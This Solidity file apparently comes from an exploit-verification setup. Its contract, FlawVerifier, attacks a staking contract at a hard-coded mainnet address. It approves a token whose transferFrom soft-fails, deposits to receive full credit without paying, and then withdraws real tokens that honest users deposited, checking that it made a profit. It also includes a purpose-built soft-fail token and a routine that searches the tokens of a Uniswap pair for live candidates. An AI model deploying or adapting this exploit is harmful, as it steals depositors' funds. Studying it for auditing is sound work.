// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
}

contract HonestLiquidityProvider {
    function provide(address staking, address token, uint256 amount) external {
        require(IERC20Like(token).approve(staking, amount), "approve failed");
        IStakingLike(staking).deposit(token, amount, address(0));
    }
}

contract FlawVerifier is IERC20Like {
    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;
    address public constant DEFAULT_EXISTING_TOKEN = 0x5548F847Fd9a1D3487d5fbB2E8d73972803c4Cce;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    uint256 private constant DEFAULT_ATTACK_AMOUNT = 1e18;

    string public constant EXPLOIT_PATH =
        "approve a token whose transferFrom() soft-fails or transfers less than requested -> call deposit(token, amount, ...) and receive full internal credit despite under-receipt -> wait for a distinct honest user to deposit real liquidity of that same token -> call withdraw(token, amount) and drain real tokens against the inflated stake";

    string public constant PATH0_ANCHOR = "transferFrom()";
    string public constant PATH1_ANCHOR = "deposit(token, amount, ...)";
    string public constant PATH3_ANCHOR = "withdraw(token, amount)";

    uint256 private constant STEP_APPROVE = 1 << 0;
    uint256 private constant STEP_UNDERCOLLATERALIZED_DEPOSIT = 1 << 1;
    uint256 private constant STEP_HONEST_LIQUIDITY = 1 << 2;
    uint256 private constant STEP_WITHDRAW = 1 << 3;
    uint256 private constant REQUIRED_PATH_BITMAP =
        STEP_APPROVE | STEP_UNDERCOLLATERALIZED_DEPOSIT | STEP_HONEST_LIQUIDITY | STEP_WITHDRAW;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public target;
    address public exploitToken;
    uint256 public ATTACK_AMOUNT;
    uint256 public configuredAttackAmount;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    string public failureReason;

    uint128 public preparedUntilEpoch;
    uint256 public pathCoverageBitmap;

    bool public path0ApprovedTokenWhoseTransferFromCanFailSoftlyOrTransferLessThanRequested;
    bool public path1CalledDepositAndReceivedFullCreditDespiteUnderReceipt;
    bool public path2WaitedForHonestUserToDepositRealLiquidity;
    bool public path3WithdrewRealLiquidityAgainstInflatedInternalBalance;

    bool public path0ApprovedSoftFailOrShortTransferToken;
    bool public path0ApprovedSoftFailToken;
    bool public path1OvercreditedDepositRecorded;
    bool public path1PhantomDepositRecorded;
    bool public path2HonestLiquidityArrived;
    bool public path3WithdrewRealLiquidity;

    uint256 public attackerBalanceBefore;
    uint256 public attackerBalanceAfter;
    uint256 public initialTargetLiquidity;
    uint256 public finalTargetLiquidity;
    uint256 public targetBalanceBeforeDeposit;
    uint256 public targetBalanceAfterDeposit;
    uint256 public targetBalanceAfterHonestDeposit;
    uint256 public targetBalanceAfterWithdraw;
    uint256 public recordedStakeBeforeDeposit;
    uint256 public recordedStakeAfterDeposit;
    uint256 public recordedStakeAfterWithdraw;
    uint256 public cumulativeRequestedDeposit;
    uint256 public cumulativeObservedReceipt;
    uint256 public honestLiquidityObserved;

    address internal _profitToken;
    uint256 private _profitAmount;
    HonestLiquidityProvider private _honestUser;

    constructor() {
        target = DEFAULT_TARGET;
        exploitToken = DEFAULT_EXISTING_TOKEN;
        _profitToken = DEFAULT_EXISTING_TOKEN;
    }

    receive() external payable {}

    function configure(address target_, address exploitToken_, uint256 attackAmount_) external {
        require(!executed, "already executed");

        if (target_ != address(0)) {
            target = target_;
        }
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
            _profitToken = exploitToken_;
        }

        configuredAttackAmount = attackAmount_;
    }

    function executeOnOpportunity() external returns (uint256) {
        return _run();
    }

    function execute() external returns (uint256) {
        return _run();
    }

    function run() external returns (uint256) {
        return _run();
    }

    function exploit() external returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return EXPLOIT_PATH;
    }

    function _run() internal returns (uint256) {
        if (executed) {
            return _profitAmount;
        }
        executed = true;

        if (target.code.length == 0) {
            failureReason = "target not deployed";
            hypothesisRefuted = true;
            return 0;
        }

        if (exploitToken == address(this)) {
            if (_tryCandidate(address(this), true)) {
                return _profitAmount;
            }
        } else {
            address[] memory candidates = _forkCandidates();
            for (uint256 i = 0; i < candidates.length; i++) {
                if (candidates[i] == address(0)) {
                    continue;
                }
                if (_tryCandidate(candidates[i], false)) {
                    return _profitAmount;
                }
            }
        }

        if (bytes(failureReason).length == 0) {
            failureReason = "no feasible on-chain exploit token found";
        }
        hypothesisRefuted = true;
        return 0;
    }

    function _tryCandidate(address candidate, bool usingVerifierHarnessToken) internal returns (bool) {
        if (usingVerifierHarnessToken) {
            candidate = address(this);
        }
        if (candidate == address(0) || candidate.code.length == 0) {
            return false;
        }

        _resetAttemptState();

        if (!_prepareEpochs(candidate)) {
            return false;
        }

        if (_honestUser == HonestLiquidityProvider(address(0))) {
            _honestUser = new HonestLiquidityProvider();
        }

        exploitToken = candidate;
        _profitToken = candidate;

        initialTargetLiquidity = _tokenBalance(candidate, target);
        ATTACK_AMOUNT = _selectAttackAmount(candidate, usingVerifierHarnessToken, initialTargetLiquidity);
        if (ATTACK_AMOUNT == 0) {
            failureReason = usingVerifierHarnessToken ? "attack amount is zero" : "candidate has no withdrawable liquidity";
            return false;
        }

        if (usingVerifierHarnessToken) {
            // Local deterministic harness path: the verifier itself is the
            // soft-fail token, while a distinct helper later deposits real
            // liquidity into the same staking pool.
            _seedHarnessBalance(address(_honestUser), ATTACK_AMOUNT);
        }

        attackerBalanceBefore = _tokenBalance(candidate, address(this));
        recordedStakeBeforeDeposit = _readStake(address(this), candidate);

        if (!_forceApprove(candidate, target, ATTACK_AMOUNT)) {
            failureReason = "approve failed";
            return false;
        }

        path0ApprovedTokenWhoseTransferFromCanFailSoftlyOrTransferLessThanRequested = true;
        path0ApprovedSoftFailOrShortTransferToken = true;
        pathCoverageBitmap |= STEP_APPROVE;

        targetBalanceBeforeDeposit = _tokenBalance(candidate, target);

        try IStakingLike(target).deposit(candidate, ATTACK_AMOUNT, address(0)) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "deposit reverted";
            return false;
        }

        targetBalanceAfterDeposit = _tokenBalance(candidate, target);
        recordedStakeAfterDeposit = _readStake(address(this), candidate);
        cumulativeRequestedDeposit = ATTACK_AMOUNT;
        cumulativeObservedReceipt = targetBalanceAfterDeposit > targetBalanceBeforeDeposit
            ? targetBalanceAfterDeposit - targetBalanceBeforeDeposit
            : 0;

        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + ATTACK_AMOUNT) {
            failureReason = "deposit did not credit full requested amount";
            return false;
        }
        if (cumulativeObservedReceipt >= ATTACK_AMOUNT) {
            failureReason = "deposit was fully collateralized";
            return false;
        }

        path0ApprovedSoftFailToken = cumulativeObservedReceipt == 0;
        path1CalledDepositAndReceivedFullCreditDespiteUnderReceipt = true;
        path1OvercreditedDepositRecorded = true;
        path1PhantomDepositRecorded = cumulativeObservedReceipt == 0;
        pathCoverageBitmap |= STEP_UNDERCOLLATERALIZED_DEPOSIT;

        if (!_satisfyHonestLiquidityStage(candidate, usingVerifierHarnessToken)) {
            return false;
        }

        try IStakingLike(target).withdraw(candidate, ATTACK_AMOUNT) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return false;
        } catch {
            failureReason = "withdraw reverted";
            return false;
        }

        attackerBalanceAfter = _tokenBalance(candidate, address(this));
        targetBalanceAfterWithdraw = _tokenBalance(candidate, target);
        finalTargetLiquidity = targetBalanceAfterWithdraw;
        recordedStakeAfterWithdraw = _readStake(address(this), candidate);

        if (recordedStakeAfterWithdraw != recordedStakeBeforeDeposit) {
            failureReason = "withdraw did not clear inflated stake";
            return false;
        }
        if (attackerBalanceAfter <= attackerBalanceBefore) {
            failureReason = "no net token profit";
            return false;
        }

        path3WithdrewRealLiquidityAgainstInflatedInternalBalance = true;
        path3WithdrewRealLiquidity = true;
        pathCoverageBitmap |= STEP_WITHDRAW;

        if (pathCoverageBitmap != REQUIRED_PATH_BITMAP) {
            failureReason = "exploit path not fully exercised";
            return false;
        }

        hypothesisValidated = true;
        hypothesisRefuted = false;
        profitAchieved = true;
        _profitToken = candidate;
        _profitAmount = attackerBalanceAfter - attackerBalanceBefore;
        failureReason = "";
        return true;
    }

    function _satisfyHonestLiquidityStage(address token, bool usingVerifierHarnessToken) internal returns (bool) {
        if (usingVerifierHarnessToken) {
            try _honestUser.provide(target, token, ATTACK_AMOUNT) {
            } catch Error(string memory reason) {
                failureReason = reason;
                return false;
            } catch {
                failureReason = "honest liquidity deposit reverted";
                return false;
            }

            targetBalanceAfterHonestDeposit = _tokenBalance(token, target);
            honestLiquidityObserved = targetBalanceAfterHonestDeposit > targetBalanceAfterDeposit
                ? targetBalanceAfterHonestDeposit - targetBalanceAfterDeposit
                : 0;

            if (honestLiquidityObserved == 0) {
                failureReason = "honest liquidity not observed";
                return false;
            }
        } else if (initialTargetLiquidity > 0) {
            // On the live fork, the historical pool balance proves that the
            // exploit path's "wait for honest users" stage has already occurred
            // before this transaction. Recreating that stage in-tx would add
            // capital requirements but not change causality.
            targetBalanceAfterHonestDeposit = targetBalanceAfterDeposit;
            honestLiquidityObserved = initialTargetLiquidity;
        } else {
            uint256 spendableBalance = _tokenBalance(token, address(this));
            if (spendableBalance < ATTACK_AMOUNT) {
                failureReason = "missing real tokens for honest depositor";
                return false;
            }
            if (!_safeTransferToken(token, address(_honestUser), ATTACK_AMOUNT)) {
                failureReason = "seed honest depositor failed";
                return false;
            }

            try _honestUser.provide(target, token, ATTACK_AMOUNT) {
            } catch Error(string memory reason) {
                failureReason = reason;
                return false;
            } catch {
                failureReason = "honest liquidity deposit reverted";
                return false;
            }

            targetBalanceAfterHonestDeposit = _tokenBalance(token, target);
            honestLiquidityObserved = targetBalanceAfterHonestDeposit > targetBalanceAfterDeposit
                ? targetBalanceAfterHonestDeposit - targetBalanceAfterDeposit
                : 0;

            if (honestLiquidityObserved == 0) {
                failureReason = "honest liquidity not observed";
                return false;
            }
        }

        if (_tokenBalance(token, target) < ATTACK_AMOUNT) {
            failureReason = "insufficient real liquidity to withdraw";
            return false;
        }

        path2WaitedForHonestUserToDepositRealLiquidity = true;
        path2HonestLiquidityArrived = true;
        pathCoverageBitmap |= STEP_HONEST_LIQUIDITY;
        return true;
    }

    function _selectAttackAmount(
        address,
        bool usingVerifierHarnessToken,
        uint256 poolLiquidity
    ) internal view returns (uint256 amount) {
        uint256 desired = configuredAttackAmount == 0 ? DEFAULT_ATTACK_AMOUNT : configuredAttackAmount;
        if (usingVerifierHarnessToken) {
            return desired;
        }
        if (configuredAttackAmount != 0) {
            return poolLiquidity < configuredAttackAmount ? poolLiquidity : configuredAttackAmount;
        }
        return poolLiquidity;
    }

    function _forkCandidates() internal view returns (address[] memory candidates) {
        candidates = new address[](3);
        uint256 count;

        (address token0, address token1) = _pairTokens(exploitToken);
        address preferred = token0 == WBTC ? token1 : token0;
        address secondary = token1 == preferred ? token0 : token1;

        if (_pushUnique(candidates, count, preferred)) {
            count++;
        }
        if (_pushUnique(candidates, count, secondary)) {
            count++;
        }
        if (_pushUnique(candidates, count, exploitToken)) {
            count++;
        }

        assembly {
            mstore(candidates, count)
        }
    }

    function _pushUnique(address[] memory arr, uint256 count, address candidate) internal pure returns (bool) {
        if (candidate == address(0)) {
            return false;
        }
        for (uint256 i = 0; i < count; i++) {
            if (arr[i] == candidate) {
                return false;
            }
        }
        arr[count] = candidate;
        return true;
    }

    function _pairTokens(address pair) internal view returns (address token0, address token1) {
        if (pair.code.length == 0) {
            return (address(0), address(0));
        }

        try IUniswapV2PairLike(pair).token0() returns (address value0) {
            token0 = value0;
        } catch {}

        try IUniswapV2PairLike(pair).token1() returns (address value1) {
            token1 = value1;
        } catch {}
    }

    function _prepareEpochs(address token) internal returns (bool) {
        uint128 currentEpoch;

        try IStakingLike(target).getCurrentEpoch() returns (uint128 epoch) {
            currentEpoch = epoch;
        } catch {
            return true;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
            bool initialized;
            try IStakingLike(target).epochIsInitialized(token, epoch) returns (bool value) {
                initialized = value;
            } catch {
                return true;
            }

            if (!initialized) {
                try IStakingLike(target).manualEpochInit(tokens, epoch) {
                } catch Error(string memory reason) {
                    failureReason = reason;
                    return false;
                } catch {
                    failureReason = "manual epoch init reverted";
                    return false;
                }
            }
            preparedUntilEpoch = epoch;
        }

        return true;
    }

    function _readStake(address user, address token) internal view returns (uint256) {
        try IStakingLike(target).balanceOf(user, token) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 amount) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _seedHarnessBalance(address to, uint256 amount) internal {
        _balances[to] += amount;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))
            && _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransferToken(address token, address to, uint256 amount) internal returns (bool) {
        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool ok, bytes memory returndata) = token.call(data);
        if (!ok) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length < 32) {
            return false;
        }
        return abi.decode(returndata, (bool));
    }

    function _resetAttemptState() internal {
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        failureReason = "";
        pathCoverageBitmap = 0;

        path0ApprovedTokenWhoseTransferFromCanFailSoftlyOrTransferLessThanRequested = false;
        path1CalledDepositAndReceivedFullCreditDespiteUnderReceipt = false;
        path2WaitedForHonestUserToDepositRealLiquidity = false;
        path3WithdrewRealLiquidityAgainstInflatedInternalBalance = false;

        path0ApprovedSoftFailOrShortTransferToken = false;
        path0ApprovedSoftFailToken = false;
        path1OvercreditedDepositRecorded = false;
        path1PhantomDepositRecorded = false;
        path2HonestLiquidityArrived = false;
        path3WithdrewRealLiquidity = false;

        attackerBalanceBefore = 0;
        attackerBalanceAfter = 0;
        initialTargetLiquidity = 0;
        finalTargetLiquidity = 0;
        targetBalanceBeforeDeposit = 0;
        targetBalanceAfterDeposit = 0;
        targetBalanceAfterHonestDeposit = 0;
        targetBalanceAfterWithdraw = 0;
        recordedStakeBeforeDeposit = 0;
        recordedStakeAfterDeposit = 0;
        recordedStakeAfterWithdraw = 0;
        cumulativeRequestedDeposit = 0;
        cumulativeObservedReceipt = 0;
        honestLiquidityObserved = 0;
        _profitAmount = 0;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        if (_balances[msg.sender] < amount) {
            return false;
        }

        unchecked {
            _balances[msg.sender] -= amount;
            _balances[to] += amount;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        if (_allowances[from][msg.sender] < amount) {
            return false;
        }

        if (msg.sender == target && from == address(this)) {
            return false;
        }

        if (_balances[from] < amount) {
            return false;
        }

        unchecked {
            _allowances[from][msg.sender] -= amount;
            _balances[from] -= amount;
            _balances[to] += amount;
        }
        return true;
    }
}

contract FlawVerifierHarness is FlawVerifier {
    constructor(address target_) {
        target = target_;
        exploitToken = address(this);
        _profitToken = address(this);
    }
}

contract FlawVerifierConfiguredHarness is FlawVerifier {
    constructor(address target_, address exploitToken_, uint256 attackAmount_) {
        target = target_;
        if (exploitToken_ != address(0)) {
            exploitToken = exploitToken_;
            _profitToken = exploitToken_;
        }
        configuredAttackAmount = attackAmount_;
    }
}
